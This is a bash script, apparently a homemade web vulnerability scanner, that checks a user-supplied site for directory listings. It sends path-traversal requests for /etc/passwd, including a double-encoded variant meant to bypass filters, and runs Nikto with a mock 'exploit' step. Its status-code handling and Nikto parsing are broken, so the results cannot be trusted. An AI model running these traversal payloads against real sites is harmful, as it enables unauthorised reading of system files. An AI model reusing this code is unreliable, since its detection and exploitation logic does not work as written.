#!/bin/bash
# This is a comment

# ANSI color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to perform Directory Listing detection
detect_directory_listing() {
    local url=$1
    echo "Detecting Directory Listing for: $url..."
    # Send a request and analyze the response body and response code
    curl -s -w "%{http_code}" -o temp_response.txt "$url" >/dev/null 2>&1
    local response_code=$(tail -n1 temp_response.txt)
    local response_body=$(sed '$d' temp_response.txt)
    
    # Check for directory listing indicators
    if grep -q '<title>Index of' <<< "$response_body" || grep -q 'Directory Listing' <<< "$response_body"; then
        echo -e "${RED}Directory listing detected:${NC} $url"
        # Try to bypass security systems
        bypass_security_systems "$url"
    else
        echo -e "${GREEN}No directory listing detected.${NC}"
    fi

    # Output response code and response content
    echo "Response Code: $response_code"
    echo "Response Content:"
    echo "$response_body"
}

# Function to perform additional checks using payloads
perform_additional_checks() {
    local url=$1
    echo -e "${YELLOW}Performing additional checks for: $url...${NC}"
    # Example payload to check for PHP filter bypass
    local response=$(curl -s -o /dev/null -w "%{http_code}" "$url/../../../../etc/passwd")
    if [ "$response" == "200" ]; then
        echo -e "${RED}Potential directory traversal vulnerability detected:${NC} $url"
        suggest_testing "$url" "Directory Traversal"
    else
        echo -e "${GREEN}No additional vulnerabilities detected.${NC}"
    fi
}

# Function to suggest how to test the detected vulnerability
suggest_testing() {
    local url=$1
    local vulnerability=$2

    echo -e "${YELLOW}Suggested Testing for $vulnerability:${NC}"
    case $vulnerability in
        "Directory Traversal")
            echo -e "1. Attempt to access sensitive files using directory traversal (e.g., /etc/passwd)."
            echo -e "2. Explore other directories and attempt to access restricted content."
            ;;
        # Add more cases for other vulnerabilities if needed
        *)
            echo -e "No specific testing suggestions available for $vulnerability."
            ;;
    esac
}

# Function to scan for common vulnerabilities using Nikto
scan_for_vulnerabilities() {
    local url=$1
    echo -e "${YELLOW}Scanning for common vulnerabilities using Nikto for: $url...${NC}"
    nikto -h "$url" > nikto_output.txt

    # Analyze Nikto's results and suggest testing
    analyze_nikto_results
}

# Function to analyze Nikto's results and suggest testing
analyze_nikto_results() {
    local vulnerabilities=$(grep "+ " nikto_output.txt | cut -d' ' -f2-)
    if [ -n "$vulnerabilities" ]; then
        echo -e "${RED}Vulnerabilities Detected:${NC}"
        echo "$vulnerabilities"
        # Attempt exploitation for detected vulnerabilities
        echo -e "${YELLOW}Attempting to exploit vulnerabilities...${NC}"
        exploit_vulnerabilities "$vulnerabilities"
    else
        echo -e "${GREEN}No vulnerabilities detected.${NC}"
    fi
}

# Function to attempt exploitation for detected vulnerabilities
exploit_vulnerabilities() {
    local vulnerabilities=$1
    while IFS= read -r line; do
        # Extract URL and vulnerability description
        local url=$(echo "$line" | cut -d'|' -f1 | tr -d ' ')
        local description=$(echo "$line" | cut -d'|' -f2- | tr -d ' ')
        # Extract payload based on vulnerability description (example)
        local payload=$(echo "$description" | grep -oP 'Payload:\s\K.*')
        echo -e "${YELLOW}Exploiting vulnerability for: $url...${NC}"
        echo -e "${BLUE}URL:${NC} $url"
        echo -e "${BLUE}Payload:${NC} $payload"
        # Suggest testing with clickable links
        suggest_testing_with_links "$url" "$payload"
    done <<< "$vulnerabilities"
}

# Function to suggest testing with corresponding URLs and payloads as clickable links
suggest_testing_with_links() {
    local url=$1
    local payload=$2

    echo -e "${YELLOW}Suggested Testing:${NC}"
    echo -e "1. Attempt to exploit the vulnerability using the following URL and payload:"
    echo -e "${BLUE}URL:${NC} ${url}"
    echo -e "${BLUE}Payload:${NC} ${payload}"
    echo -e "2. Explore other directories and attempt to access restricted content."
}

# Function to attempt bypassing security systems
bypass_security_systems() {
    local url=$1
    echo -e "${YELLOW}Attempting to bypass security systems for: $url...${NC}"
    # Example payload to bypass security systems
    local response=$(curl -s -w "%{http_code}" -o /dev/null "$url/..%252f..%252fetc/passwd")
    if [ "$response" == "200" ]; then
        echo -e "${RED}Security systems bypassed:${NC} $url"
    else
        echo -e "${GREEN}Security systems could not be bypassed.${NC}"
    fi
}

# Main function
main() {
    echo -e "${GREEN}Directory Listing Detection Tool${NC}"
    echo "--------------------------------"

    # Prompt user for target website link
    read -p "Enter your target website link: " url

    # Perform Directory Listing detection
    detect_directory_listing "$url"

    # Perform additional checks using payloads
    perform_additional_checks "$url"

    # Scan for common vulnerabilities using other tools (Nikto)
    scan_for_vulnerabilities "$url"

    # Clean up temporary files
    rm temp_response.txt nikto_output.txt
}

# Call main function
main
